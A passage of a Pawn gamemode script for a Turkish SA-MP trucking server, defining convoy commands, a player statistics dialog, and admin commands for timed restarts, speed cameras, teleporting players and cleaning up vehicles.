						SendClientMessage(OtherPlayer, 0x00FF00FF, Msg);
					}
					else
					    SendClientMessage(playerid, 0xFF0000FF, "You cannot kick a player that's not part of your convoy");
				}
			}
			else
			    SendClientMessage(playerid, 0xFF0000FF, "You need to be the leader of a convoy to kick another convoy-member");
		}
		else
		    SendClientMessage(playerid, 0xFF0000FF, "You need to be the leader of a convoy to kick another convoy-member");
	}
	else
		return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Allows a convoy-member to leave the convoy
CMD:convoyayril(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/convoyayril", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if this player is part of a convoy
		if (APlayerData[playerid][InConvoy] == true)
		{
		    // Kick the other player from the convoy
			Convoy_Leave(playerid);
			// Inform the player that he left the convoy
			SendClientMessage(playerid, 0x00FF00FF, "Convoydan Ayrildiniz.");
		}
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Allows the leader to cancel a convoy
CMD:convoyiptal(playerid, params[])
{
	// Setup local variables
	new Convoy, LeaderID;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/convoyiptal", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		Convoy = APlayerData[playerid][ConvoyID]; // Get the convoy of the player
		LeaderID = AConvoys[Convoy][Members][0]; // Get the leader of his convoy

		// Check if this player is part of a convoy
		if (APlayerData[playerid][InConvoy] == true)
		{
			// Check if this player is the leader of the convoy
			if (LeaderID == playerid)
				Convoy_Cancel(Convoy); // Cancel the convoy, kicking every other member from it
			else
			    SendClientMessage(playerid, 0xFF0000FF, "Oyuncuyu atmak icin convoy lideri olmak zorundasiniz.");
		}
		else
		    SendClientMessage(playerid, 0xFF0000FF, "Oyuncuyu atmak icin convoy lideri olmak zorundasiniz.");
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// /convoykontrol
CMD:convoykontrol(playerid, params[])
{
	// Setup local variables
	new Name[24], MemberList[1000], Convoy;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/convoykontrol", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the member is in a convoy
		if (APlayerData[playerid][InConvoy] == true)
		{
			// Get the convoyID of the member
			Convoy = APlayerData[playerid][ConvoyID];

			// Loop through all members
			for (new i; i < CONVOY_MAX_MEMBERS; i++)
			{
			    if (AConvoys[Convoy][Members][i] != -1) // Check if this member-spot is occupied
				{
				    if(APlayerData[ AConvoys[Convoy][Members][i] ][JobStep] == 1 || APlayerData[ AConvoys[Convoy][Members][i] ][JobStep] == 3)
				    {
						// Get the name of the member
						GetPlayerName(AConvoys[Convoy][Members][i], Name, sizeof(Name));
						// Add the membernames to the list
						format(MemberList, 1000, "%s%s(%d)\n", MemberList, Name, AConvoys[Convoy][Members][i]);
					}
				}
			}

			// Show the dialog
			ShowPlayerDialog(playerid, DialogConvoyMembers, DIALOG_STYLE_LIST, "Yükü Almayan veya Boþaltmayanlar", MemberList, "Tamam", "Cancel");
		}
		else
		    SendClientMessage(playerid, 0xFF0000FF, "Herhangi Bir Konvoyda Degilsiniz.");
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Displays all members in the convoy
CMD:convoyuye(playerid, params[])
{
	// Setup local variables
	new Name[24], MemberList[1000], Convoy;

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/convoyuye", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the member is in a convoy
		if (APlayerData[playerid][InConvoy] == true)
		{
			// Get the convoyID of the member
			Convoy = APlayerData[playerid][ConvoyID];

			// Loop through all members
			for (new i; i < CONVOY_MAX_MEMBERS; i++)
			{
			    if (AConvoys[Convoy][Members][i] != -1) // Check if this member-spot is occupied
				{
					// Get the name of the member
					GetPlayerName(AConvoys[Convoy][Members][i], Name, sizeof(Name));
					// Add the membernames to the list
					format(MemberList, 1000, "%s%s\n", MemberList, Name);
				}
			}

			// Show the dialog
			ShowPlayerDialog(playerid, DialogConvoyMembers, DIALOG_STYLE_LIST, "Convoydakiler", MemberList, "Tamam", "Cancel");
		}
		else
		    SendClientMessage(playerid, 0xFF0000FF, "Herhangi Bir Konvoyda Degilsiniz.");
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

CMD:c(playerid, params[])
{
	if (APlayerData[playerid][InConvoy] == false) return SendClientMessage(playerid, 0xFF0000FF, "Herhangi Bir Konvoyda Degilsiniz.");
	// Setup local variables
	new Name[24], Msg[160], Message[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/c", params);

	// Get the player's name
	GetPlayerName(playerid, Name, sizeof(Name));

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		if (sscanf(params, "s[128]", Message)) SendSyntaxMessage(playerid, "/c <Mesaj>");
		else
		{
			// Loop through all players
			for (new i; i < CONVOY_MAX_MEMBERS; i++)
			{
			    if (AConvoys[ APlayerData[playerid][ConvoyID] ][Members][i] != -1) // Check if this member-spot is occupied
				{
					format(Msg, 160, "{FF0000}[KONVOY]%s: {FFFFFF}%s", Name, Message);
					SendClientMessage(AConvoys[ APlayerData[playerid][ConvoyID] ][Members][i], 0xFFFFFFFF, Msg);
				}
			}
		}
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// Displays the statictics of the player
CMD:bilgilerim(playerid, params[])
{
	// Setup local variables
	new StatsMsg[2000], TitleMsg[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/bilgilerim", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		format(StatsMsg, 2000, "%s{DDDDDD}Kayýt Tarihi\t{FF0000}%d/%d/%d\n", StatsMsg, pInfo[playerid][pKGun], pInfo[playerid][pKAy], pInfo[playerid][pKYil]);
		format(StatsMsg, 2000, "%s{DDDDDD}Önceki Giriþ\t{FF0000}%d/%d/%d\n", StatsMsg, pInfo[playerid][pSGun], pInfo[playerid][pSAy], pInfo[playerid][pSYil]);

		format(StatsMsg, 2000, "%s{DDDDDD}Online Süresi\t{ADFF2F}%d Gün %d Saat %d Dakika %d Saniye\n", StatsMsg, pInfo[playerid][pOGun], pInfo[playerid][pOSaat], pInfo[playerid][pODakika], pInfo[playerid][pOSaniye]);

		// Construct the stats
		switch(APlayerData[playerid][PlayerClass])
		{
 			case ClassTruckDriver: format(StatsMsg, 2000, "%s{DDDDDD}Rank\t{ADFF2F}%s\n", StatsMsg, TruckerRanks[ Rank[playerid] ][RankName]);
   			case ClassBusDriver: format(StatsMsg, 2000, "%s{DDDDDD}Rank\t{ADFF2F}%s\n", StatsMsg, BusDriverRanks[ Rank[playerid] ][RankName]);
	    	case ClassDolmusDriver: format(StatsMsg, 2000, "%s{DDDDDD}Rank\t{ADFF2F}%s\n", StatsMsg, DolmusDriverRanks[ Rank[playerid] ][RankName]);
	    	case ClassPilot: format(StatsMsg, 2000, "%s{DDDDDD}Rank\t{ADFF2F}%s\n", StatsMsg, PilotRanks[ Rank[playerid] ][RankName]);
	    	case ClassPolice: format(StatsMsg, 2000, "%s{DDDDDD}Rank\t{ADFF2F}%s\n", StatsMsg, PoliceRanks[ Rank[playerid] ][RankName]);
	    	case ClassMafia: format(StatsMsg, 2000, "%s{DDDDDD}Rank\t{ADFF2F}%s\n", StatsMsg, MafiaRanks[ Rank[playerid] ][RankName]);
	    	case ClassRoadWorker: format(StatsMsg, 2000, "%s{DDDDDD}Rank\t{ADFF2F}%s\n", StatsMsg, RoadWorkerRanks[ Rank[playerid] ][RankName]);
	    	case ClassPboy: format(StatsMsg, 2000, "%s{DDDDDD}Rank\t{ADFF2F}%s\n", StatsMsg, PboyRanks[ Rank[playerid] ][RankName]);
		}

		format(StatsMsg, 2000, "%s{DDDDDD}Yapýlan Kilometre\t{ADFF2F}%f km\n", StatsMsg, (APlayerData[playerid][StatsMetersDriven] / 1000));
		format(StatsMsg, 2000, "%s{DDDDDD}Bitirilen {FF8000}Kamyoncu {DDDDDD}Görev Sayýsý\t{ADFF2F}%i\n", StatsMsg, APlayerData[playerid][StatsTruckerJobs]);
		format(StatsMsg, 2000, "%s{DDDDDD}Bitirilen {FF8000}Konvoy {DDDDDD}Görev Sayýsý\t{ADFF2F}%i\n", StatsMsg, APlayerData[playerid][StatsConvoyJobs]);
		format(StatsMsg, 2000, "%s{DDDDDD}Bitirilen {80FFFF}Otobüs {DDDDDD}Görev Sayýsý\t{ADFF2F}%i\n", StatsMsg, APlayerData[playerid][StatsBusDriverJobs]);
		format(StatsMsg, 2000, "%s{DDDDDD}Bitirilen {80FFFF}Dolmuþ {DDDDDD}Görev Sayýsý\t{ADFF2F}%i\n", StatsMsg, APlayerData[playerid][StatsDolmusDriverJobs]);
		format(StatsMsg, 2000, "%s{DDDDDD}Bitirilen {008080}Pilot {DDDDDD}Görev Sayýsý\t{ADFF2F}%i\n", StatsMsg, APlayerData[playerid][StatsPilotJobs]);
		format(StatsMsg, 2000, "%s{DDDDDD}Bitirilen {FFFF80}Yol Iscisi {DDDDDD}Görev Sayýsý\t{ADFF2F}%i\n", StatsMsg, APlayerData[playerid][StatsRoadworkerJobs]);
		format(StatsMsg, 2000, "%s{DDDDDD}Bitirilen Cöpcü Görev Sayýsý\t{ADFF2F}%i\n", StatsMsg, APlayerData[playerid][StatsCopcuJobs]);
		format(StatsMsg, 2000, "%s{DDDDDD}Bitirilen Banka Görev Sayisi\t{ADFF2F}%i\n", StatsMsg, APlayerData[playerid][StatsBankaJobs]);
		format(StatsMsg, 2000, "%s{DDDDDD}Bitirilen Itfaiye Görev Sayisi\t{ADFF2F}%i\n", StatsMsg, APlayerData[playerid][StatsFireJobs]);
		format(StatsMsg, 2000, "%s{DDDDDD}Bitirilen {80FFFF}Gemici {DDDDDD}Görev Sayýsý\t{ADFF2F}%i\n", StatsMsg, APlayerData[playerid][StatsGemiciJobs]);
		format(StatsMsg, 2000, "%s{DDDDDD}Kesilen {228B22}Aðaç {DDDDDD}Sayýsý\t{ADFF2F}%i\n", StatsMsg, APlayerData[playerid][StatsOduncuJobs]);
		format(StatsMsg, 2000, "%s{DDDDDD}Tutulan {80FFFF}Balýk {DDDDDD}Sayýsý\t{ADFF2F}%i\n", StatsMsg, APlayerData[playerid][StatsBalikciJobs]);

		format(StatsMsg, 2000, "%s{DDDDDD}Bitirilen {8000FF}Mafya {DDDDDD}Görev Sayýsý\t{ADFF2F}%i\n", StatsMsg, APlayerData[playerid][StatsMafiaJobs]);
		format(StatsMsg, 2000, "%s{DDDDDD}Mafyaya Çaldýrdýðýnýz {FF0000}Kasa {DDDDDD}Sayýsý\t{ADFF2F}%i\n", StatsMsg, APlayerData[playerid][StatsMafiaStolen]);
		format(StatsMsg, 2000, "%s{DDDDDD}Ceza Kestiðiniz {87CEEB}Oyuncu {DDDDDD}Sayýsý\t{ADFF2F}%i\n", StatsMsg, APlayerData[playerid][StatsPoliceFined]);
		format(StatsMsg, 2000, "%s{DDDDDD}Hapse Attýðýnýz {87CEEB}Oyuncu {DDDDDD}Sayýsý\t{ADFF2F}%i\n", StatsMsg, APlayerData[playerid][StatsPoliceJailed]);

		format(StatsMsg, 2000, "%s{DDDDDD}Ceza Kestiðiniz {87CEEB}Oyuncu {DDDDDD}Sayýsý(Cevik Kuvvet)\t{ADFF2F}%i\n", StatsMsg, APlayerData[playerid][StatsFBYFined]);
		format(StatsMsg, 2000, "%s{DDDDDD}Hapse Attýðýnýz {87CEEB}Oyuncu {DDDDDD}Sayýsý(Cevik Kuvvet)\t{ADFF2F}%i\n", StatsMsg, APlayerData[playerid][StatsFBYJailed]);
		format(StatsMsg, 2000, "%s{DDDDDD}Toplanýlan Gizli Kasa\t{ADFF2F}%i\n", StatsMsg, GetToplanilanGizliKasa(playerid));

		if (APlayerData[playerid][TruckerLicense] == 1)
			format(StatsMsg, 2000, "%s{DDDDDD}Kamyon Ehliyeti\t{4867FF}Var\n", StatsMsg);
		else
			format(StatsMsg, 2000, "%s{DDDDDD}Kamyon Ehliyeti\t{4867FF}Yok\n", StatsMsg);

       if (APlayerData[playerid][PilotLicense] == 1)
			format(StatsMsg, 2000, "%s{DDDDDD}Pilot Ehliyeti\t{4867FF}Var\n", StatsMsg);
		else
			format(StatsMsg, 2000, "%s{DDDDDD}Pilot Ehliyeti\t{4867FF}Yok\n", StatsMsg);

		if (APlayerData[playerid][BusLicense] == 1)
			format(StatsMsg, 2000, "%s{DDDDDD}Otobüs Ehliyeti\t{4867FF}Var\n", StatsMsg);
		else
			format(StatsMsg, 2000, "%s{DDDDDD}Otobüs Ehliyeti\t{4867FF}Yok\n", StatsMsg);

		if (APlayerData[playerid][GemiciLicense] == 1)
			format(StatsMsg, 2000, "%s{DDDDDD}Gemi Ehliyeti\t{4867FF}Var\n", StatsMsg);
		else
			format(StatsMsg, 2000, "%s{DDDDDD}Gemi Ehliyeti\t{4867FF}Yok\n", StatsMsg);

		if (APlayerData[playerid][MafiaLicense] == 1)
			format(StatsMsg, 2000, "%s{DDDDDD}Mafia Ehliyeti\t{4867FF}Var\n", StatsMsg);
		else
			format(StatsMsg, 2000, "%s{DDDDDD}Mafia Ehliyeti\t{4867FF}Yok\n", StatsMsg);

		format(TitleMsg, 128, "{4867FF}%s{F8F8FF}'nin Ýstatistikleri", GetName(playerid));

		ShowPlayerDialog(playerid, DialogStats, DIALOG_STYLE_TABLIST, TitleMsg, StatsMsg, "Kapat", "");
	}
	else
	    return 0;

	return 1;
}

CMD:stats(playerid, params[])
{
  return cmd_bilgilerim(playerid, params);
}

// Restarts the server
CMD:restart(playerid, params[])
{
	// Setup local variables
	new Msg[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/restart", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 5
		if (APlayerData[playerid][PlayerLevel] >= 6 || Root[playerid] == 1)
		{
			if (sscanf(params, "i", RestartTime)) SendSyntaxMessage(playerid, "/restart <dakika>");
			else
			{
				// Let everyone know that the server will be restarted in "RestartTime" minutes (provided by the admin)
			    format(Msg, 128, "SERVER RESTLENECEKTIR KALAN SURE :  %i DAKIKA !", RestartTime);
				GameTextForAll(Msg, 5000, 3);
				SendClientMessageToAll(0xA0A0A0, Msg);
				// Start the next timer which warns the players again every minute
				SetTimer("Timer_Restart", 1000 * 60, true);
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

forward Timer_Restart();
public Timer_Restart()
{
	// Setup local variables
	new Msg[128];

	// Decrease the RestartTime by one minute
	RestartTime--;

	// Let everyone know that the server will be restarted in 2 minutes
    format(Msg, 128, "SERVER %i DAKIKA ICINDE RESTLENECEKTIR!", RestartTime);
	GameTextForAll(Msg, 5000, 3);
	SendClientMessageToAll(0xA0A0A0, Msg);

	// Do different things based on the remaining time
	switch (RestartTime)
	{
		case 1: // One minute left
		{
			// Change the hostname of the server and change the RCON-password to something weird
			SendRconCommand("password zaevozaaaa");
		}
		case 0:
		{
			// Let everyone know that the server is kicking all players before restarting
			GameTextForAll("Server restarting:Kicking all players!", 5000, 3);
			// Kick all players
			for(new i; i < MAX_PLAYERS; i++)
				Kick(i);

			// Start the next timer that will restart the server
			SetTimer("Timer_Restart_Reboot", 1000 * 5, false);
		}
	}
}

forward Timer_Restart_Reboot();
public Timer_Restart_Reboot()
{
	new HostCommand[128];

	// Restart the server
	SendRconCommand("gmx");
	// Change the hostname and password again
	SendRconCommand(HostCommand);
	SendRconCommand("password 0");

	return 1;
}



// This command allows you to create a speedcamera
CMD:createcamera(playerid, params[])
{
	// Setup local variables
	new Float:x, Float:y, Float:z, Float:Angle, MaxSpeed, file[100], File:PFile, LineForFile[100], Msg[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/createcamera", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 5
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
		{
			if (sscanf(params, "i", MaxSpeed)) SendSyntaxMessage(playerid, "/createcamera <Hýz Limiti>");
			else
			{
				// Get player's position and facing angle
				GetPlayerPos(playerid, x, y, z);
				GetPlayerFacingAngle(playerid, Angle);
				z = z - 1.0; // Adjust camera Z-coordinate 1m lower than normal (otherwise the camera floats in the air)

				// Move the player a bit, otherwise he could get stuck inside the camera-object
				SetPlayerPos(playerid, x, y + 1.0, z + 1.0);

				// Save the camera to a file
				for (new CamID; CamID < MAX_CAMERAS; CamID++)
				{
					// Check if this index is free
					if (ACameras[CamID][CamSpeed] == 0)
					{
					    // Setup this camera (create the objects and store the data)
                        SetupSpeedCamera(CamID, x, y, z, Angle, MaxSpeed);

					    // Save the file
						format(file, sizeof(file), CameraFile, CamID); // Construct the complete filename for this camera-file

						PFile = fopen(file, io_write); // Open the camera-file for writing

						format(LineForFile, 100, "CamX %f\r\n", x);
						fwrite(PFile, LineForFile); // And save it to the file
						format(LineForFile, 100, "CamY %f\r\n", y);
						fwrite(PFile, LineForFile); // And save it to the file
						format(LineForFile, 100, "CamZ %f\r\n", z);
						fwrite(PFile, LineForFile); // And save it to the file
						format(LineForFile, 100, "CamAngle %f\r\n", Angle);
						fwrite(PFile, LineForFile); // And save it to the file
						format(LineForFile, 100, "CamSpeed %i\r\n", MaxSpeed);
						fwrite(PFile, LineForFile); // And save it to the file

						fclose(PFile); // Close the file

						// Let the player know he created a new camera
						format(Msg, 128, "You've created a speed-camera with ID: %i", CamID);
						SendClientMessage(playerid, 0x00FF00FF, Msg);

						// Exit the function
						return 1;
					}
				}

				// In case all camera-slots are occupied (100 camera's have been created already), let the player know about it
				format(Msg, 128, "{FF0000}You cannot create more than %i speedcamera's", MAX_CAMERAS);
				SendClientMessage(playerid, 0xFFFFFFFF, Msg);
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// This command allows you to delete a speedcamera
CMD:delcamera(playerid, params[])
{
	// Setup local variables
	new file[100], Msg[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/delcamera", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 5
		if (APlayerData[playerid][PlayerLevel] >= 7 || Root[playerid] == 1)
		{
				// Loop through all camera's
			for (new CamID; CamID < MAX_CAMERAS; CamID++)
			{
				// Check if this index is used
				if (ACameras[CamID][CamSpeed] != 0)
				{
					// Check if the player is in range of the camera
					if (IsPlayerInRangeOfPoint(playerid, 5.0, ACameras[CamID][CamX], ACameras[CamID][CamY], ACameras[CamID][CamZ]))
					{
					    // Delete the file
						format(file, sizeof(file), CameraFile, CamID); // Construct the complete filename for this camera-file
						if (fexist(file)) // Make sure the file exists
							fremove(file); // Delete the file

						// Delete both camera objects
					    DestroyObject(ACameras[CamID][CamObj1]);
					    DestroyObject(ACameras[CamID][CamObj2]);
						// Also clear the data from memory
					    ACameras[CamID][CamX] = 0.0;
					    ACameras[CamID][CamY] = 0.0;
					    ACameras[CamID][CamZ] = 0.0;
					    ACameras[CamID][CamAngle] = 0.0;
					    ACameras[CamID][CamSpeed] = 0;
                        ACameras[CamID][CamObj1] = 0;
                        ACameras[CamID][CamObj2] = 0;
                        Delete3DTextLabel(ACameras[CamID][LabelID]);

						// Let the player know he deleted a camera
						format(Msg, 128, "You've deleted speed-camera %i", CamID);
						SendClientMessage(playerid, 0x00FF00FF, Msg);

						// Exit the function
						return 1;
					}
				}
			}

			// In case the player wasn't near a speedcamera, inform him about it
			SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}You must be near a speedcamera to delete it");
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}



// This command ports a player to the player who executed the command
CMD:get(playerid, params[])
{
	// Setup local variables
	new OtherPlayer, Float:x, Float:y, Float:z, PortMsg[128], IntID, WorldID, Name[24];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/get", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 3 || Root[playerid] == 1 || APlayerData[playerid][PlayerRehberLevel] > 2)
		{
			if (sscanf(params, "u", OtherPlayer)) SendSyntaxMessage(playerid, "/get <ID>");
			else
			{
				// Check if that other player is online
				if (IsPlayerConnected(OtherPlayer))
				{
    				if(APlayerData[OtherPlayer][SpectateID] != -1) return SendClientMessage(playerid, -1, "{FF0000}Spec'de olan birisini yanýnýza çekemezsiniz!");

					// Get the name of the other player
					GetPlayerName(OtherPlayer, Name, sizeof(Name));
					// Get the location of the player
					GetPlayerPos(playerid, x, y, z);
					IntID = GetPlayerInterior(playerid);
					WorldID = GetPlayerVirtualWorld(playerid);

					APlayerData[OtherPlayer][PreviousX] = x;
 					APlayerData[OtherPlayer][PreviousY] = y;
  					APlayerData[OtherPlayer][PreviousZ] = z;
   					APlayerData[OtherPlayer][PreviousInt] = IntID;

					if(IsPlayerInAnyVehicle(OtherPlayer))
					{
						SetVehiclePos(GetPlayerVehicleID(OtherPlayer), x+5.0, y+5.0, z+3);
						LinkVehicleToInterior(GetPlayerVehicleID(OtherPlayer), IntID);
						SetVehicleVirtualWorld(GetPlayerVehicleID(OtherPlayer), WorldID);

						foreach(new i : Player)
						{
							if(GetPlayerVehicleID(i) == GetPlayerVehicleID(OtherPlayer))
 							{
  								SetPlayerInterior(i, IntID);
   								SetPlayerVirtualWorld(i, WorldID);
    						}
						}
					}else{
						SetPlayerPos(OtherPlayer, x+5.0, y+5.0, z);
						SetPlayerInterior(OtherPlayer, IntID);
						SetPlayerVirtualWorld(OtherPlayer, WorldID);
					}

					/*
					// Port the other player to this player
					SetPlayerVirtualWorld(OtherPlayer, WorldID);
					SetPlayerInterior(OtherPlayer, IntID);
					SetPlayerPos(OtherPlayer, x, y, z + 3.0);*/
					// Let the player know about it
					format(PortMsg, 128, "{FFFF00}%s{00FF00} yi yanýnýza çektiniz", Name);
					SendClientMessage(playerid, 0xFFFFFFFF, PortMsg);
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Bu oyuncu online deðil");
			}
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}



CMD:spawn(playerid, params[])
{
	// Setup local variables
	new OtherPlayer,Name[24],Msg[255];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/spawn", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 1
		if (APlayerData[playerid][PlayerLevel] >= 3 || Root[playerid] == 1)
		{
			if (sscanf(params, "u", OtherPlayer)) SendClientMessage(playerid, 0xFF0000AA, "spawn: \"/spawn <id>\"");
			else
			{
			    if(APlayerData[playerid][SpawnEtti] == 1)return SendClientMessage(playerid,-1,"Bu komutu 2 saniyede bir kullanabilirsin");
				// Check if that other player is online
				if (IsPlayerConnected(OtherPlayer))
				{
				    APlayerData[playerid][SpawnEtti] = 1;
				    SetTimerEx("SpawnEttiTime", 5000, false, "i", playerid);
					GetPlayerName(OtherPlayer, Name, sizeof(Name));
					SpawnPlayer(OtherPlayer);
					format(Msg, 128, "{00FF00}%s adlý oyuncu spawn edildi.", Name);
					SendClientMessage(playerid, 0xFFFFFFFF, Msg);
				}

			}
		}
	}

	return 1;
}

forward SpawnEttiTime(playerid);
public SpawnEttiTime(playerid)
{
     APlayerData[playerid][SpawnEtti] = 0;
    return 1;
}
CMD:dcar(playerid, params[]) // Altýnýzdaki Aracý Siler
{
	SendAdminText(playerid, "/dcar", params);

	if(APlayerData[playerid][PlayerLevel] < 3 && Root[playerid] == 0) return 0;
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, -1, "{FF0000}Altýnýzda yok edilecek araba yok!");
	if(AVehicleData[ GetPlayerVehicleID(playerid) ][StaticVehicle] == true) return SendClientMessage(playerid, -1, "{FF0000}Bu araç statik araç!");
	if(AVehicleData[ GetPlayerVehicleID(playerid) ][Owned] == true) return SendClientMessage(playerid, -1, "{FF0000}Bu aracýn sahibi var!");
	if(ArabaSirket[ GetPlayerVehicleID(playerid) ] != -1) return SendClientMessage(playerid, -1, "{FF0000}Bu araç þirket aracý!");
	if(TrailerSakliKasa[ GetPlayerVehicleID(playerid) ] != -1) return SendClientMessage(playerid, -1, "{FF0000}Bu araç gizli kasa!");

	if(Flashing[GetPlayerVehicleID(playerid)] == true)
	{
	    KillTimer(FlashTime[GetPlayerVehicleID(playerid)]);
	    Flashing[GetPlayerVehicleID(playerid)] = false;
	}

	DestroyVehicle(GetPlayerVehicleID(playerid));
	return 1;
}

CMD:scar(playerid, params[]) // Altýnýzdaki Aracý Respawn Eder
{
	SendAdminText(playerid, "/scar", params);

	if(APlayerData[playerid][PlayerLevel] < 3 && Root[playerid] == 0) return 0;
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, -1, "{FF0000}Altýnýzda spawn edilecek araba yok!");
	SetVehicleToRespawn(GetPlayerVehicleID(playerid));
	return 1;
}

// This command deleted all vehicles that are spawned using /car, /plane, /bike, /trailer
CMD:cleanupcars(playerid, params[])
{
	// Setup local variables
	new CarsDeleted, Msg[128];

	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/cleanupcars", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
		// Check if the player's admin-level is at least 3
		if (APlayerData[playerid][PlayerLevel] >= 3 || Root[playerid] == 1)
		{
		    // Loop through all vehicles
		    for (new vid; vid < 2000; vid++)
		    {
				// Check if this vehicle exists (check the model), otherwise all empty slots are processed as well
				if (AVehicleData[vid][Model] != 0)
				{
					// Check if the vehicle is NOT a static vehicle
					if (AVehicleData[vid][StaticVehicle] == false)
					{
						// Check if the vehicle is NOT owned by anybody (this leaves all vehicles spawned with /car, /trailer, /plane)
						if (AVehicleData[vid][Owned] == false)
						{
						    if(IsDorseOccupied2(vid)) continue;
						    if(ArabaSirket[vid] == -1 && TrailerSakliKasa[vid] == -1)
						    {
						        if(GetVehicleDriver31(vid) == -1)
						        {
						    		// Count the cars that have been deleted
									CarsDeleted++;
         							new Component;
									for(new i; i < 14; i++)
									{
										Component = GetVehicleComponentInSlot(vid, i);
										ChangeVehiclePaintjob(vid, 3);
										if(Component != 0)
										{
											RemoveVehicleComponent(vid, Component);
	 									}
									}
									if(Flashing[vid] == true)
									{
	   		 							KillTimer(FlashTime[vid]);
	    								Flashing[vid] = false;
									}
									DestroyVehicle(vid);
                                    MotorMOD[vid] = 0;
									AVehicleData[vid][Owned] = false;
									AVehicleData[vid][Owner] = 0;
									AVehicleData[vid][Model] = 0;
									AVehicleData[vid][PaintJob] = 0;
									for (new i; i < 14; i++)
			    					AVehicleData[vid][Components][i] = 0;
									AVehicleData[vid][SpawnX] = 0.0;
									AVehicleData[vid][SpawnY] = 0.0;
									AVehicleData[vid][SpawnZ] = 0.0;
									AVehicleData[vid][SpawnRot] = 0.0;
									AVehicleData[vid][BelongsToHouse] = 0;
								}
						    }
						}
					}
				}
		    }

			// Let the player know how many vehicles have been cleaned up
			format(Msg, 128, "{00FF00}Dinamik Olarak Eklenen Araclar Temizlendi , Temizlenen Arac Sayýsý : {FF0000} %i", CarsDeleted);
			SendClientMessage(playerid, 0xFFFFFFFF, Msg);
		}
		else
		    return 0;
	}
	else
	    return 0;

	// Let the server know that this was a valid command
	return 1;
}

// This command allows the player to call for assistance
CMD:asistan(playerid, params[])
{
	// Send the command to all admins so they can see it
	SendAdminText(playerid, "/asistan", params);

	// Check if the player has logged in
	if (APlayerData[playerid][LoggedIn] == true)
	{
	    if(APlayerData[playerid][PlayerMoney] < 2000) return SendClientMessage(playerid, -1, "{FF0000}2000$'ýnýz yok!");
	    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	    {
	        new VModel = GetVehicleModel(GetPlayerVehicleID(playerid));
	        if(VModel == VehicleShamal || VModel == VehicleNevada || VModel == VehicleAT400 || VModel == VehicleAndromada || VModel == VehicleMaverick || VModel == VehicleDodo)
	        {
				// Fully repair the vehicle (damage value and bodywork)
				RepairVehicle(GetPlayerVehicleID(playerid));
				// Also re-fuel the vehicle
			// ARAC BENÝNZÝN %67	AVehicleData[GetPlayerVehicleID(playerid)][Fuel] = 2400;
    			new engine,alarm,doors,bonnet,boot,objective;
       			SetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, 1, alarm, doors, bonnet, boot, objective);
       			carmsg[playerid] = 0;
				RewardPlayer(playerid, -2000, 0);
				// Let the player know he spent $2000 for auto-repair because there were no assistance players online
			    SendClientMessage(playerid, 0xFFFFFFFF, "{FFFFFF}Aracýnýz {FF0000} $2000 {FFFFFF}'a tamir edildi.");
			    //SendClientMessage(playerid, 0xFFFFFFFF, "");
				return 1;
			}
	    }

		// Check if the player is the driver of a vehicle
		if (GetPlayerVehicleSeat(playerid) == 0)
		{
			// Fully repair the vehicle (damage value and bodywork)
			RepairVehicle(GetPlayerVehicleID(playerid));
			// Also re-fuel the vehicle
			AVehicleData[GetPlayerVehicleID(playerid)][Fuel] = 2000;
		    new engine,alarm,doors,bonnet,boot,objective;
	     	SetVehicleParamsEx(GetPlayerVehicleID(playerid), engine, 1, alarm, doors, bonnet, boot, objective);
       		carmsg[playerid] = 0;
			RewardPlayer(playerid, -2000, 0);
			// Let the player know he spent $2000 for auto-repair because there were no assistance players online
		 	SendClientMessage(playerid, 0xFFFFFFFF, "{FFFFFF}Aracýnýz {FF0000} $2000 {FFFFFF}'a tamir edildi.");
